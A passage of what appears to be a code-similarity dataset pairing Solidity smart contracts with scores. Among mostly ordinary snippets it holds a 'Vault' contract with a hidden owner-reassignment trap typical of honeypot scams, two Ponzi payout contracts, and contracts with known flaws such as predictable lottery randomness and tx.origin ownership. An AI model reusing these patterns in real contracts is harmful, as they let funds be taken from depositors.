    return (owner == ownerAddr);
  }
}",0.6578449637299405,"contract starShipToken is starShipTokenInterface {

    using SafeMath for uint256;



  

  constructor(string _name, string _symbol, uint256 _ID) public {

    name = _name;

    symbol = _symbol;

    ID = _ID;

    owner = msg.sender;

  }



  

  function viewOwner() public view returns (address) {

    return owner;

  }



  

  function transfer(address _to) public returns (bool) {

    require(_to != address(0));

    require(msg.sender == owner);



    owner = _to;

    emit Transfer(msg.sender, _to);

    return true;

  }

}"
"contract Mudhoney is HasOwner {
    function Mudhoney() HasOwner() public {}
}",0.6312526335359375,"contract Mortal is Owned {
    
    function kill() onlyOwner
    { suicide(owner); }
}"
"contract ERC223Receiver {
    function tokenReceiveLogic1() internal {
        require(tokenReceiveAmount > 3);
        
    }

    function tokenReceiveLogic2() internal {
        require(tokenReceiveAmount > 1);
        
    }


    function tokenFallback(
        address _sender,
        uint256 _value,
        bytes _extraData) returns (bool) {
        if (condition 1) {
            
            
        } else if (condition 2) {
            
            
        }
    }
}",0.60387862671277,"contract ERC20Mintable  {
    
    function mint(address to, uint256 value) public returns (bool) {
    }
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function addMinter(address account) public;
    function renounceMinter() public;
}"
"contract Campaign {

    struct Request {
        string description;
        uint value;
        address payable recipient;
        bool complete;
        uint approvalCount;
        mapping(address => bool) approvals;
    }

    Request[] public requests;
    address public manager;
    uint public minimumContribution;
    mapping(address => bool) public approvers;
    uint public approversCount;

    modifier restricted() {
        require(msg.sender == manager);
        _;
    }

    constructor(uint minimum, address creator) public {
        manager = creator;
        minimumContribution = minimum;
    }

    function contribute() public payable {
        require(msg.value > minimumContribution);
        approvers[msg.sender] = true;
        approversCount++;
    }

    function createRequest(string memory description, uint value, address payable recipient) public restricted {
        Request memory newRequest = Request({
            description: description,
            value: value,
            recipient: recipient,
            complete: false,
            approvalCount: 0
        });

        requests.push(newRequest);
    }

    function approveRequest(uint index) public {
        Request storage request = requests[index];

        require(approvers[msg.sender]);
        require(!request.approvals[msg.sender]);

        request.approvals[msg.sender] == true;
        request.approvalCount++;
    }

    function finalizeRequest(uint index) public restricted{
        Request storage request = requests[index];

        require(request.approvalCount > (approversCount / 2));
        require(!request.complete);

        request.recipient.transfer(request.value);
        request.complete = true;
    }
}",0.6040246769794483,"contract Vault is TokenVault {
    
    event Deposit(address indexed depositor, uint amount);
    event Withdrawal(address indexed to, uint amount);
    event OpenDate(uint date);

    mapping (address => uint) public Deposits;
    uint minDeposit;
    bool Locked;
    uint Date;

    function init() payable open {
        Owner = msg.sender;
        minDeposit = 1 ether;
        Locked = false;
        deposit();
    }
    
    function MinimumDeposit() public constant returns (uint) { return minDeposit; }
    function ReleaseDate() public constant returns (uint) { return Date; }
    function WithdrawEnabled() public constant returns (bool) { return Date > 0 && Date <= now; }

    function() public payable { deposit(); }

    function deposit() public payable {
        if (msg.value > 0) {
            if (msg.value >= MinimumDeposit())
                Deposits[msg.sender] += msg.value;
            Deposit(msg.sender, msg.value);
        }
    }

    function setRelease(uint newDate) public { 
        Date = newDate;
        OpenDate(Date);
    }

    function withdraw(address to, uint amount) public onlyOwner {
        if (WithdrawEnabled()) {
            uint max = Deposits[msg.sender];
            if (max > 0 && amount <= max) {
                to.transfer(amount);
                Withdrawal(to, amount);
            }
        }
    }

    function lock() public { Locked = true; } address owner;
    modifier open { if (!Locked) _; owner = msg.sender; }
    function kill() public { require(this.balance == 0); selfdestruct(Owner); }
    function getOwner() external constant returns (address) { return owner; }
}"
"contract Escrow {

 address public challenger;
 address public participant;
 address public arbiter;

 function Escrow(address _participant, address _arbiter) {
   challenger = msg.sender;
   participant = _participant;
   arbiter = _arbiter;
 }

 function payoutToParticipant() {
   if(msg.sender == challenger || msg.sender == arbiter) {
     participant.send(this.balance);
   }
 }

 function refundToChallenger() {
   if(msg.sender == challenger || msg.sender == arbiter) {
     challenger.send(this.balance);
   }
 }

 function getBalance() constant returns (uint) {
   return this.balance;
 }

}",0.6355719391491539,"contract ArbitrageCoin {
    
    
    address public minter;
    mapping (address => uint) public balances;

    
    
    event Sent(address from, address to, uint amount);

    
    
    function Coin() public {
        minter = msg.sender;
    }

    function mint(address receiver, uint amount) public {
        if (msg.sender != minter) return;
        balances[receiver] += amount;
    }

    function send(address receiver, uint amount) public {
        if (balances[msg.sender] < amount) return;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        Sent(msg.sender, receiver, amount);
    }
}"
"contract TestSmartContract {

mapping(string => string) mappingField;
address sender;

function TestSmartContract() public {
    sender = msg.sender;
}

function addData(string key,  string value) public {
    mappingField[key] = value;
}}",0.6342838547884463,"contract SaveString{

    constructor() public {

    }

    mapping (uint=>string) data;

    function setStr(uint key, string value) public {

        data[key] = value;

    }

    function getStr(uint key) public constant returns(string){

        return data[key];

    }

}"
"contract C {
    uint public number1;
    uint public number2;

    function incOne() public view {
        inc(number1);
    }

    function incTwo() public view {
        inc(number2);
    }

    function inc(uint storage d) internal pure {
        d += 1;                                         
    }
}",0.6398105124220734,"contract PotLike {
    function pie(address) virtual public view returns (uint);
    function drip() virtual public returns (uint);
    function join(uint) virtual public;
    function exit(uint) virtual public;
}"
"contract InterfaceWithMe {

    function call() returns (string);

}",0.6866628853506371,"contract VoxInterface {
    function par() public returns (uint);
}"
"contract Upper {
    uint public count;

    constructor() payable public {}

    function() payable public {
        count++;
    }
}",0.674361993859704,"contract WWW_wallet
{
    function Put(uint) public payable;
    

    function Collect(uint) public payable;

}"
"contract Caller {
    function run(address addr) payable public {
        addr.transfer(msg.value);
    }
}",0.6643193208213668,"contract HoardCrowdsale {

    function invest(address addr,uint tokenAmount) public payable {

    }

}"
"contract MyContractEtherEvents {
   mapping(address => uint256) public balances;
   address payable wallet;
   event Purchase(
    address indexed _buyer,
    uint256 _amount
   );

   constructor(address payable _wallet) public {
    wallet = _wallet;
   }

   function() external payable {
     buyToken();
   }

   function buyToken() public payable {
    balances[msg.sender] += 1;
    wallet.transfer(msg.value);
    emit Purchase(msg.sender, 1);
   }
 }",0.6943933038218659,"contract Wallet is Ownable {



    event ReceiveEther(address indexed _sender, uint256 _value);

    event Pay(address indexed _sender, uint256 _value);



    function() external payable {

        emit ReceiveEther(msg.sender, msg.value);

    }



    function pay(address payable _beneficiary) public onlyOwner {

        uint256 amount = address(this).balance;

        _beneficiary.transfer(amount);

        emit Pay(_beneficiary, amount);

    }



}"
"contract Helper {
  function getBalance() returns (uint bal) {
    return this.balance; 
  }
}",0.6976072950520928,"contract ElcoinDb {
    function getBalance(address addr) constant returns(uint balance);
}"
"contract WhitehatWithdraw is Owned {
    uint constant WithdrawType_DIRECT = 1;
    uint constant WithdrawType_PROXY = 2;

    DAOBalanceSnapShot daoBalance;
    mapping (address => uint) paidOut;
    mapping (bytes32 => bool) usedSignatures;
    uint totalFunds;
    uint deployTime;
    uint closingTime;
    address whg_donation;
    address escape;
    address remainingBeneficary;
    bool sealed;

    event Withdraw(address indexed dth, address indexed beneficiary, uint256  amount, uint256 percentageWHG, uint256 withdrawType);
    event CertifiedDepositorsChanged(address indexed _depositor, bool _allowed);
    event Deposit(uint amount);
    event EscapeCalled(uint amount);
    event RemainingClaimed(uint amount);


    function fill(uint[] data) onlyOwner {
        if ((msg.sender != owner)||(sealed))
            throw;

        for (uint i=0; i< data.length; i+= 2) {
            address dth = address(data[i]);
            uint amount = uint(data[i+1]);
            paidOut[dth] = amount;
            totalFunds += amount;
        }
    }

    function seal() {
        if ((msg.sender != owner)||(sealed))
            throw;

        sealed= true;
    }

    function WhitehatWithdraw(address _whg_donation, address _daoBalanceSnapshotAddress, address _escapeAddress, address _remainingBeneficiary) {
        whg_donation = _whg_donation;
        daoBalance = DAOBalanceSnapShot(_daoBalanceSnapshotAddress);
        escape = _escapeAddress;
        remainingBeneficary = _remainingBeneficiary;

        totalFunds = msg.value;
        deployTime = now;
        closingTime = 24 weeks;
    }

    
    
    
    
    
    function calculateWithdraw(address _dth) constant noEther returns(uint) {
        uint tokens = daoBalance.balanceOf(_dth);

        uint acumulatedReward = tokens * totalFunds / daoBalance.totalSupply();
        if (acumulatedReward < paidOut[_dth]) {
            return 0;
        }

        return acumulatedReward - paidOut[_dth];
    }

    
    
    
    
    
    
    
    
    
    
    
    function commonWithdraw(address _dth, address _beneficiary, uint _percentageWHG, uint _withdrawType) internal {
        if (_percentageWHG > 100) {
            throw;
        }

        uint toPay = calculateWithdraw(_dth);
        if (toPay == 0) {
            return;
        }

        if (toPay > this.balance) {
            toPay = this.balance;
        }

        uint portionWhg = toPay * _percentageWHG / 100;
        uint portionDth = toPay - portionWhg;
        paidOut[_dth] += toPay;

        
        

        if (portionWhg > 0) {
             if ( !whg_donation.send(portionWhg) ) {
                throw;
             }
        }

        if (portionDth > 0) {
            if (!_beneficiary.send(portionDth) ) {
                throw;
            }
        }

        Withdraw(_dth, _beneficiary,  toPay, _percentageWHG, _withdrawType);
    }

    
    
    function withdraw(address _beneficiary, uint _percentageWHG ) noEther {
        commonWithdraw(msg.sender, _beneficiary, _percentageWHG, WithdrawType_DIRECT);
    }

    
    
    
    
    
    
    
    
    
    function proxyWithdraw(address _beneficiary, uint _percentageWHG, uint8 _v, bytes32 _r, bytes32 _s) noEther {
        if (usedSignatures[_r]) {
            throw;
        }
        bytes32 _hash = sha3(""Withdraw DAOETC to "", _beneficiary, _percentageWHG);
        address _dth = ecrecover(_hash, _v, _r, _s);
        usedSignatures[_r] = true;
        commonWithdraw(_dth, _beneficiary, _percentageWHG, WithdrawType_PROXY);
    }

    
    
    function deposit() returns (bool) {
        totalFunds += msg.value;
        Deposit(msg.value);
        return true;
    }

    
    
    function escapeHatch() noEther onlyOwner returns (bool) {
        uint total = this.balance;
        if (!escape.send(total)) {
            throw;
        }
        EscapeCalled(total);
    }

    
    
    function claimRemaining() noEther returns (bool) {
        if (now < deployTime + closingTime) {
            throw;
        }
        uint total = this.balance;
        if (!remainingBeneficary.send(total)) {
            throw;
        }
        RemainingClaimed(total);
    }

    
    
    
    function extendClosingTime(uint _additionalSeconds) noEther onlyOwner {
        closingTime += _additionalSeconds;
    }

    function () { 
        throw;
    }

    function getPaidOut(address _account) noEther constant returns (uint) {
        return paidOut[_account];
    }

    function getMyBalance(address _account) noEther constant returns (uint) {
        return daoBalance.balanceOf(_account);
    }

    function getTotalFunds() noEther constant returns (uint) {
        return totalFunds;
    }

    function getWHGDonationAddress() noEther constant returns (address) {
        return whg_donation;
    }
}",0.6121729867038861,"contract IronHands is Owned {
    
    
     
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    
    modifier notPowh(address aContract){
        require(aContract != address(weak_hands));
        _;
    }
   
    
    event Deposit(uint256 amount, address depositer);
    event Purchase(uint256 amountSpent, uint256 tokensReceived);
    event Payout(uint256 amount, address creditor);
    event Dividends(uint256 amount);
    event Donation(uint256 amount, address donator);
    event ContinuityBreak(uint256 position, address skipped, uint256 amount);
    event ContinuityAppeal(uint256 oldPosition, uint256 newPosition, address appealer);

    
    struct Participant {
        address etherAddress;
        uint256 payout;
    }

    
    uint256 throughput;
    
    uint256 dividends;
    
    uint256 public multiplier;
    
    uint256 public payoutOrder = 0;
    
    uint256 public backlog = 0;
    
    Participant[] public participants;
    
    mapping(address => uint256) public creditRemaining;
    
    POWH weak_hands;

    
    function IronHands(uint multiplierPercent, address powh) public {
        multiplier = multiplierPercent;
        weak_hands = POWH(powh);
    }
    
    
    
    function() payable public {
    }
    
     
    function deposit() payable public {
        
        require(msg.value > 1000000 && msg.value <= 5000000000000000);
        
        uint256 amountCredited = (msg.value * multiplier) / 100;
        
        participants.push(Participant(msg.sender, amountCredited));
        
        backlog += amountCredited;
        
        creditRemaining[msg.sender] += amountCredited;
        
        emit Deposit(msg.value, msg.sender);
        
        if(myDividends() > 0){
            
            withdraw();
        }
        
        payout();
    }
    
    
    function payout() public {
        
        uint balance = address(this).balance;
        
        require(balance > 1);
        
        throughput += balance;
        
        uint investment = balance / 2;
        
        balance -= investment;
        
        uint256 tokens = weak_hands.buy.value(investment).gas(1000000)(msg.sender);
        
        emit Purchase(investment, tokens);
        
        while (balance > 0) {
            
            uint payoutToSend = balance < participants[payoutOrder].payout ? balance : participants[payoutOrder].payout;
            
            if(payoutToSend > 0){
                
                balance -= payoutToSend;
                
                backlog -= payoutToSend;
                
                creditRemaining[participants[payoutOrder].etherAddress] -= payoutToSend;
                
                participants[payoutOrder].payout -= payoutToSend;
                
                if(participants[payoutOrder].etherAddress.call.value(payoutToSend).gas(1000000)()){
                    
                    emit Payout(payoutToSend, participants[payoutOrder].etherAddress);
                }else{
                    
                    balance += payoutToSend;
                    backlog += payoutToSend;
                    creditRemaining[participants[payoutOrder].etherAddress] += payoutToSend;
                    participants[payoutOrder].payout += payoutToSend;
                }

            }
            
            if(balance > 0){
                
                payoutOrder += 1;
            }
            
            if(payoutOrder >= participants.length){
                return;
            }
        }
    }
    
    
    function myTokens() public view returns(uint256){
        return weak_hands.myTokens();
    }
    
    
    function myDividends() public view returns(uint256){
        return weak_hands.myDividends(true);
    }
    
    
    function totalDividends() public view returns(uint256){
        return dividends;
    }
    
    
    
    function withdraw() public {
        uint256 balance = address(this).balance;
        weak_hands.withdraw.gas(1000000)();
        uint256 dividendsPaid = address(this).balance - balance;
        dividends += dividendsPaid;
        emit Dividends(dividendsPaid);
    }
    
    
    function donate() payable public {
        emit Donation(msg.value, msg.sender);
    }
    
    
    function backlogLength() public view returns (uint256){
        return participants.length - payoutOrder;
    }
    
    
    function backlogAmount() public view returns (uint256){
        return backlog;
    } 
    
    
    function totalParticipants() public view returns (uint256){
        return participants.length;
    }
    
    
    function totalSpent() public view returns (uint256){
        return throughput;
    }
    
    
    function amountOwed(address anAddress) public view returns (uint256) {
        return creditRemaining[anAddress];
    }
     
     
    function amountIAmOwed() public view returns (uint256){
        return amountOwed(msg.sender);
    }
    
    
    function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens) public onlyOwner notPowh(tokenAddress) returns (bool success) {
        return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);
    }
    
}"
"contract Byt {
  event bytDone (uint256 a, uint256 b);
  function takeByt(bytes memory byt) public returns (uint256, uint256) {
    (uint256 a, uint256 b) = abi.decode (
      byt,
      (uint256, uint256));
    emit bytDone(a, b);
    return (a, b);
  }
}",0.6872282620131553,"contract SafeMath {
    function safeAdd(uint256 a, uint256 b) public pure returns (uint256 c) {
        c = a + b;
        require(c >= a);
    }

    function safeSub(uint256 a, uint256 b) public pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }
}"
"contract Lottery {
    address public manager;
    address[] public players;

    constructor() public {
        manager = msg.sender;
    }

    function enter() public payable {
        require(msg.value > .01 ether);
        players.push(msg.sender);
    }

    function random() private view returns(uint) {
        return uint(keccak256(block.difficulty, now, players));
    }

    function winner() public restricted {
        uint index = random() % players.length;
        players[index].transfer(this.balance);
        players = new address[](0);
    }

    function allplayers() public {
        return players;
    }

    modifier restricted() {
        require(msg.sender == manager);
        _;
    }
}",0.6903616239356779,"contract BulletinBoard {



    struct Message {

        address sender;

        string text;

        uint timestamp;

        uint payment;

    }



    Message[] public messages;

    address public owner;



    constructor() public {

        owner = msg.sender;

    }



    function addMessage(string text) public payable {

        require(msg.value >= 0.000001 ether * bytes(text).length);

        messages.push(Message(msg.sender, text, block.timestamp, msg.value));

    }



    function numMessages() public constant returns (uint) {

        return messages.length;

    }



    function withdraw() public {

        require(msg.sender == owner);

        msg.sender.transfer(address(this).balance);

    }

}"
"contract AccessControl {

    address public ceoAddress;

    modifier onlyCEO() {
        require(msg.sender == ceoAddress);
        _;
    }

    function setCEO(address _newCEO) external onlyCEO {
        require(_newCEO != address(0));

        ceoAddress = _newCEO;
    }
}",0.6735530381741899,"contract Serverable is Ownable {
    address public server;

    modifier onlyServer() { require(msg.sender == server); _;}

    function setServerAddress(address _newServerAddress) external onlyOwner {
        server = _newServerAddress;
    }
}"
"contract EtherStore {

        
        uint256 public withdrawalLimit = 1 ether;

        mapping(address => uint256) public lastWithdrawTime;
        mapping(address => uint256) public balances;

        function depositFunds() public payable {
            balances[msg.sender] += msg.value;
            }

        function withdrawFunds (uint256 _weiToWithdraw) public {

            ...
            ...
        }  
    }",0.6472065884949549,"contract tokenInterface {
	function balanceOf(address _owner) public constant returns (uint256 balance);
	function transfer(address _to, uint256 _value) public returns (bool);
	function burn(uint256 _value) public returns(bool);
	uint256 public totalSupply;
	uint256 public decimals;
}"
"contract TodoList {

    event NewTodo(uint todoId, string value);
    event DeleteTodo(uint todoId, string value);

    mapping(uint => address) public todoOwner;
    mapping(address => uint) ownerTodoCount;

    TodoItem[] public todoItems;

    struct TodoItem {
        string value;
        
        bool active;
    }

    function createTodo(string _value) internal returns(uint) {
        uint id = todoItems.push(TodoItem(_value, true)) - 1;
        todoOwner[id] = msg.sender;
        ownerTodoCount[msg.sender]++;
        NewTodo(id, _value);
        return id;
    }

    function getAllTodos() constant returns(string[], bool[]) {
        uint length = todoItems.length;

        string[] memory values = new string[](length);
        bool[] memory actives = new bool[](length);

        for (uint i = 0; i < length; i++) {
            values[i] = todoItems[i].value;
            actives[i] = todoItems[i].active;
        }

        return (values, actives);
    }  
}",0.6147990258550012,"contract MockTestNetworkToken {

    
    string public constant name = ""Test Network Token"";
    string public constant symbol = ""TNT"";
    uint8 public constant decimals = 18;  

    
    uint256 totalTokens;

    
    mapping (address => uint256) balances;

    
    bool transferable;


    
    
    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    

    function transfer(address _to, uint256 _value) returns (bool) {
        if (transferable && balances[msg.sender] >= _value && _value > 0) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        }
        return false;
    }

    function totalSupply() external constant returns (uint256) {
        return totalTokens;
    }

    function balanceOf(address _owner) external constant returns (uint256) {
        return balances[_owner];
    }

}"
"contract Gateway is Ownable{
using SafeMath for uint;


struct BuyInfo {
  address buyerAddress; 
  address sellerAddress;
  uint value;
  address currency;
}

mapping(address => mapping(uint => BuyInfo)) public payment;


function getBuyerAddressPayment(address _sellerAddress, uint _orderId) public pure returns(address){
  return  payment[_sellerAddress][_orderId].buyerAddress;
}    
function getSellerAddressPayment(address _sellerAddress, uint _orderId) public pure returns(address){
  return  payment[_sellerAddress][_orderId].sellerAddress;
}    

function getValuePayment(address _sellerAddress, uint _orderId) public pure returns(uint){
  return  payment[_sellerAddress][_orderId].value;
}    

function getCurrencyPayment(address _sellerAddress, uint _orderId) public pure returns(address){
  return  payment[_sellerAddress][_orderId].currency;
}


function payToken(address _tokenAddress, address _sellerAddress, uint _orderId,  uint _value) public returns (bool success){
  require(_tokenAddress != address(0));
  require(_sellerAddress != address(0)); 
  require(_value > 0);
  Token token = Token(_tokenAddress);
  require(token.allowance(msg.sender, this) >= _value);
  payment[_sellerAddress][_orderId] = BuyInfo(msg.sender, _sellerAddress, _value, _tokenAddress);
  success = true;
}
function payEth(address _sellerAddress, uint _orderId, uint _value) internal returns  (bool success){
  require(_sellerAddress != address(0)); 
  require(_value > 0);
  payment[_sellerAddress][_orderId] = BuyInfo(msg.sender, _sellerAddress, _value, 0x0000000000000000000000000000000000000001);    
  success = true;
}

function balanceOfToken(address _tokenAddress, address _Address) public pure returns (uint) {
  Token token = Token(_tokenAddress);
  return token.balanceOf(_Address);
}

function bytesToAddress(bytes source) internal pure returns(address) {
  uint result;
  uint mul = 1;
  for(uint i = 20; i > 0; i--) {
    result += uint8(source[i-1])*mul;
    mul = mul*256;
  }
  return address(result);
}
function() external payable {
  require(msg.data.length == 20); 
  require(msg.value > 99999999999);
  address sellerAddress = bytesToAddress(bytes(msg.data));
  uint value = msg.value.div(10000000000).mul(10000000000);
  uint orderId = msg.value.sub(value);
  payEth(sellerAddress, orderId, value);
  }
}",0.6458540742817587,"contract TokenDB is Owned {
    
    using SafeMath for uint256;
    
    struct balances_s {
        uint256 amount;
        bool valid;
    }
    
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => balances_s) public balances;
    address public tokenAddress;
    address public oldDBAddress;
    
    constructor(address _owner, address _tokenAddress, address _icoAddress, address _oldDBAddress) Owned(_owner) public {
        if ( _oldDBAddress == 0x00  && _icoAddress != 0x00 ) {
            balances[_icoAddress].amount = 44e16;
        }
        oldDBAddress = _oldDBAddress;
        tokenAddress = _tokenAddress;
    }
    
    function changeTokenAddress(address _tokenAddress) external forOwner {
        tokenAddress = _tokenAddress;
    }
    function transfer(address _from, address _to, uint256 _amount) external forToken returns(bool _success) {
        uint256 _senderBalance = _getBalance(_from);
        uint256 _receiverBalance = _getBalance(_to);
        balances[_from].amount = _senderBalance.sub(_amount);
        balances[_to].amount = _receiverBalance.add(_amount);
        return true;
    }
    function bulkTransfer(address _from, address[] _to, uint256[] _amount) external forToken returns(bool _success) {
        uint256 _senderBalance = _getBalance(_from);
        uint256 _receiverBalance;
        uint256 i;
        for ( i=0 ; i<_to.length ; i++ ) {
            _receiverBalance = _getBalance(_to[i]);
            _senderBalance = _senderBalance.sub(_amount[i]);
            balances[_to[i]].amount = _receiverBalance.add(_amount[i]);
        }
        balances[_from].amount = _senderBalance;
        return true;
    }
    function setAllowance(address _owner, address _spender, uint256 _amount) external forToken returns(bool _success) {
        allowance[_owner][_spender] = _amount;
        return true;
    }
    
    function getAllowance(address _owner, address _spender) public view returns(bool _success, uint256 _remaining) {
        return ( true, allowance[_owner][_spender] );
    }
    function balanceOf(address _owner) public view returns(bool _success, uint256 _balance) {
        return ( true, _getBalance(_owner) );
    }
    
    function _getBalance(address _owner) internal returns(uint256 _balance) {
        if ( ( ! balances[_owner].valid ) && oldDBAddress != 0x00 ) {
            bool _subResult;
            ( _subResult, _balance ) = TokenDB(oldDBAddress).balanceOf(_owner);
            balances[_owner].amount = _balance;
            balances[_owner].valid = true;
        }
        return balances[_owner].amount;
    }
    
    modifier forToken {
        require( msg.sender == tokenAddress );
        _;
    }
}"
"contract Greeter {
    
    struct GreetingMessage {
        string message;
        address owner;
    } 
    
    modifier onlyOwner() {
        require(owner == msg.sender, ""Only owner can execute this command!"");
        _; 
    }  
    
    address payable owner;
    GreetingMessage[] greetings;
    uint public repliesCount;
    
    constructor() public {
        owner = msg.sender;
        greetings.push(GreetingMessage(""Hello, Ramazan"", msg.sender)); 
    }

    
    function receive() external payable {}
    
    function fallback() external payable {}

    function getGreeting(uint idx) public onlyOwner view returns (string memory, address) {
        GreetingMessage storage greeting = greetings[idx];
        return (greeting.message, greeting.owner);
    }
    
    function setGreeting(string memory newGreeting) public {
        repliesCount++;
        greetings.push(GreetingMessage(newGreeting, msg.sender));
    }
    
    function kill() onlyOwner public {
        selfdestruct(owner); 
    }
 
}",0.6176423358061058,"contract PayableOwnable {
    address payable private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    
    constructor() internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    
    function owner() public view returns (address payable) {
        return _owner;
    }

    
    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    
    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    
    function transferOwnership(address payable newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    
    function _transferOwnership(address payable newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}"
"contract Greeter {
  string greeting;
  address public creator;

  function Greeter(string _greeting) {
    creator = msg.sender;
    greeting = _greeting;
  }

  function greet() constant returns (string) {
    return greeting;
  }
}",0.6285619187929116,"contract Lobster {

    address private owner;
    string private flag;
    
    constructor () public {
        owner = msg.sender;
    }
    
    function getFlag() public view returns (string memory) {
        require(msg.sender == owner);
        return flag;
    }
    
}"
"contract GreeterFactory {
    function makeGreeter(string greeting) returns (address) {
        return new Greeter(greeting);
    }

    function verify(address child) returns (bool) {
      Greeter child = Greeter(child);
      
    }
}",0.6233386926715362,"contract NEST_2_Mapping {
	function checkAddress(string memory name) public view returns (address contractAddress);
	function checkOwners(address man) public view returns (bool);
}"
"contract C {

  address public owner; 
  address public creator;

  constructor (address _creator) public {
    owner = tx.origin;
    creator = _creator;
  }

  function() public payable {}

  function printOwner() public view returns(address h) {
      h = owner;
  }

}",0.6940864038419089,"contract ZZ
{
    address creator;
    function ZZ() public payable {
        creator = msg.sender;
    }

    function getMessage() public pure returns (bytes32) {
        return ""ZZ loves mandy."";
    }
  
    function e() public { 
        if (msg.sender == creator)
            selfdestruct(creator);
    }
}"
"contract CFactory {
  address public owner;
  address public currentContractAddress;

  constructor() public {
    owner = msg.sender;
    currentContractAddress = address(this);
  }

  

  function test1() public returns(address){
    C c = new C(currentContractAddress);
    return c.printOwner();
  }

}",0.668872919975237,"contract BalanceChecker {
  address public owner;
 

  constructor() public {
    owner = msg.sender;
  }

  function check(address[] memory addresses) public view returns (bool){
    
 
    for(uint i=0; i<addresses.length;i++){
      if(addresses[i].balance != 0){
          return true;
      }
    }
    return false;
    
  }
}"
"contract Test {
    uint testVal;
   function Test(uint testValue){
       testVal=testValue;
   }
   function multiply(uint a) returns(uint d) {
       return a * 7 *testVal;
   }
}",0.6353685288281428,"contract SimpleStorage {
  uint storedData;

  function set(uint x) {
    storedData = x;
  }

  function get() constant returns (uint retVal) {
    return storedData;
  }
}"
"contract Product {
    bytes32 public Name;

    function Product (bytes32 _Name) {
        Name = _Name;
    }
}",0.672936320858037,"contract GroveAPI {
  function insert(bytes32 indexName, bytes32 id, int value) public;
}"
"contract DieselPrice is usingOraclize {

uint public DieselPriceUSD;

event newOraclizeQuery(string description);
event newDieselPrice(string price);

function DieselPrice() public payable{
    update(); 
}

function __callback(bytes32 myid, string result)public {
    if (msg.sender != oraclize_cbAddress()) throw;
    newDieselPrice(result);
    DieselPriceUSD = parseInt(result, 2); 
    
}

function update() payable {
    newOraclizeQuery(""Oraclize query was sent, standing by for the answer.."");
    oraclize_query(""URL"", ""xml(https:
}",0.6018707073587227,"contract I_Pricer {
    uint128 public lastPrice;
    uint public constant DELAY = 1 days;
    I_minter public mint;
    string public sURL;
    mapping (bytes32 => uint) RevTransaction;
    function setMinter(address _newAddress) {}
    function __callback(bytes32 myid, string result) {}
    function queryCost() constant returns (uint128 _value) {}
    function QuickPrice() payable {}
    function requestPrice(uint _actionID) payable returns (uint _TrasID){}
    function collectFee() returns(bool) {}
    function () {
        
        revert();
    }
}"
"contract partTwo is partOne{
    uint public ownerBalance;
    function partTwo() public {
        ownerBalance = 500;
    }
}",0.6002548949489069,"contract TokenInterface is ERC20 {
    function deposit() public payable;
    function withdraw(uint) public;
}"
"contract Sample {

  address private receiver;
  uint public amount;

  function pay(address _receiver, uint _amount) payable public returns (bool) {
    receiver = _receiver;
    amount =_amount;
    receiver.transfer(amount);
    return true;
  }
}",0.6812401411052305,"contract Token {
    mapping (address => uint256) public balanceOf;
    function transferFrom(
         address _from,
         address _to,
         uint256 _amount
     ) public payable returns(bool success) {
        _from = _from;
        _to = _to;
        _amount = _amount;
        return true;
    }
}"
"contract Registration {
address public owner;
uint conceptPrice;
uint conceptValue;

function Registration(uint _conceptPrice) public {
    owner = msg.sender;
    conceptPrice = _conceptPrice;
    conceptValue = conceptPrice;
}



struct Request {
    uint reqId;
    uint amount;
    uint percentage;
    address modAdd;
    
    uint state;
}

Request[] public requests;

function request(uint _amount, uint _percentage) public returns (uint numRequests) {
    bool present = false;
    for (uint i = 0; i <= participants.length; i++) {
        if (participants[i] == msg.sender) {
            present = true;
            break;
        }
    }
    
    if (msg.sender == owner || _amount < conceptPrice || _amount < balances[msg.sender] || _percentage > 5 || present == false) return;
    Request memory req = Request({reqId : requests.length + 1, amount : _amount, percentage : _percentage, modAdd : msg.sender, state : 0});
    
    requests.push(req);
    numRequests = requests.length;
}

uint[] ident;
uint[] per;
uint[] amountV;

function pendingRequest() public {

    for (uint i = 0; i == requests.length; i++) {
        if (requests[i].state == 0) {
            ident.push(requests[i].reqId);
            per.push(requests[i].percentage);
            amountV.push(requests[i].amount);
        }
    }
}
function printReq() public constant returns (uint[] ident_){
    ident_ = ident;
}
}",0.6316663805087664,"contract NiceGuyPonzi {

  struct Person {
      address etherAddress;
      uint amount;
  }

  Person[] public persons;

  uint public payoutIdx = 0;
  uint public collectedFees;
  uint public balance = 0;
  uint public niceGuy;

  address public owner;


  modifier onlyowner { if (msg.sender == owner) _ }


  function NiceGuyPonzi() {
    owner = msg.sender;
  }

  function() {
    enter();
  }
  
  function enter() {
    if (msg.value < 1/100 ether) {
        msg.sender.send(msg.value);
        return;
    }
	
		uint amount;
		if (msg.value > 10 ether) {
			msg.sender.send(msg.value - 10 ether);	
			amount = 10 ether;
    }
		else {
			amount = msg.value;
		}

    if (niceGuy < 10){
        uint idx = persons.length;
        persons.length += 1;
        persons[idx].etherAddress = msg.sender;
        persons[idx].amount = amount;
        niceGuy += 1;
    }
    else {
        owner = msg.sender;
        niceGuy = 0;
        return;
    }
    
    if (idx != 0) {
      collectedFees += amount / 10;
	  owner.send(collectedFees);
	  collectedFees = 0;
      balance += amount - amount / 10;
    } 
    else {
      balance += amount;
    }


    while (balance > persons[payoutIdx].amount / 100 * 125) {
      uint transactionAmount = persons[payoutIdx].amount / 100 * 125;
      persons[payoutIdx].etherAddress.send(transactionAmount);
      balance -= transactionAmount;
      payoutIdx += 1;
    }
  }


  function setOwner(address _owner) onlyowner {
      owner = _owner;
  }
}"
"contract B {
  mapping(uint => address) instances;
  function newA(uint id) {
    instances[id] = new A();
  }
}",0.6046810402423368,"contract ERC20Constant {
